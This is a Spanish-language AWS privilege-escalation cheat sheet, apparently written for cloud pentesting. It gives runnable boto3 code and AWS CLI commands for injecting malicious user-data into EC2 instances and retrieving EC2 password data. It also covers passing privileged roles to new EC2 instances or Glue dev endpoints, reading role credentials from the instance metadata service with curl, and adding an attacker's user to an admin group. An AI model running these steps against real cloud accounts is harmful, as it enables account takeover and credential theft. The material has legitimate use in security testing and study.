# Inyección de código en user data

El user data es una funcionalidad de AWS que permite proporcionar scripts o instrucciones que se ejecutan al iniciar la instancia.

#### Permisos necesarios

- ec2:StopInstances
- ec2:ModifyInstanceAttribute
- ec2:StartInstances

        import boto3
        
        # Crear un cliente de EC2
        ec2_client = boto3.client('ec2')
        
        # Definir el ID de la instancia EC2
        instance_id = 'i-1234567890abcdef0'
        
        # Detener la instancia EC2
        ec2_client.stop_instances(InstanceIds=[instance_id])
        
        # Modificar los datos de usuario de la instancia EC2 para ejecutar comandos maliciosos
        user_data_script = '#!/bin/bash\n\nmalicious_command\n'
        ec2_client.modify_instance_attribute(
            InstanceId=instance_id,
            UserData={'Value': user_data_script}
        )
        
        # Iniciar la instancia EC2
        ec2_client.start_instances(InstanceIds=[instance_id])

---

# Recuperación de contraseñas de un EC2

#### Permisos requeridos

- ec2:GetPasswordData

        import boto3
        
        def retrieve_ec2_password(instance_id):
            # Crear un cliente de EC2
            client = boto3.client('ec2')
            
            # Recuperar los datos de la contraseña para la instancia dada
            response = client.get_password_data(InstanceId=instance_id)
            
            # Devolver los datos de la contraseña
            return response['PasswordData']

---
# CreateEC2WithExistingIP

Para este ataque el usuario malicioso creará una nueva instancia de EC2 a la que tendrá acceso y le transferirá un rol de servicio/perfil con permisos privilegiados de una instancia existente.

#### Permisos requeridos:

- iam:PassRole
- ec2:RunInstances

#### Se necesitará:

- imagen AMI
- tipo de instancia
- IAM instance profile: Nombre o ARN de un perfil de instancia de IAM con privilegios elevados.
- Key-name: CLave ssh (creadas por nosotros)
- Id de un security group

        aws ec2 run-instances --image-id <ami> --instance-type t2.micro --iam-instance-profile Arn=<arn> --key-name "<nombre_del_archivo_key>" --security-group-ids <id_security_group> --region <region> --profile <perfil_atacante>


##### Una vez creada, buscaremos información de la instancia para obtener la ip pública

        aws ec2 describe-instances --instance-id <id> --region <region> --profile <perfil_atacante>

##### Accedemos a la instancia por medio de SSH

        ssh ec2-user@35.175.174.111 -i RSA

##### Una vez adentro de la EC2 listamos nuestros privilegios para ver si se asignó el rol

        aws sts get-caller-identity
##### Si el rol es de administrador, podemos sumar a nuestro usuario a la el grupo de administradores y continuar auditando

        aws iam add-user-to-group --group-name <grupo_admins> --user-name <user_atacante>

---

# PassExistingRoleToNewGlueDevEndpoint

El fin de este ataque es crear un entorno de desarrollo al que adjuntaremos un rol elevado. Luego aprovecharemos esta instancia para consultar los metadatos y extraer las credenciales del rol para luego impersonarlo.

#### Permisos necesarios

- iam:PassRole 
- glue:CreateDevEndpoint
- glue:GetDevEndpoints

##### 1) Creamos una llave SSH

        ssh-keygen

##### 2) Creamos el endpoint de desarrollo

        aws glue create-dev-endpoint --endpoint-name privesctest --role-arn <ARN_rol_a_adjuntar> --public-key file:///home/hacker/.ssh/id_rsa.pub --profile <perfil_atacante>

##### 3)Colectamos el ip público de la instancia

        aws glue get-dev-endpoint --endpoint-name privesctest --profile <perfil_atacante>

##### 4) Nos conectamos por ssh

        ssh glue@ec2-18-119-9-156.us-east-2.compute.amazonaws.com -i /home/hacker/.ssh/id_rsa

##### 5) hacemos un curl a la api interna para obtener las credenciales de un rol

        curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<rol>

##### 6) Creamos un nuevo perfil en una nueva consola de AWS y nos logueamos con las credenciales y agregamos a nuestro user al grupo con privilegios

        aws iam add-user-to-group --group-name <grupo_admins> --user-name <user_atacante>

        


        
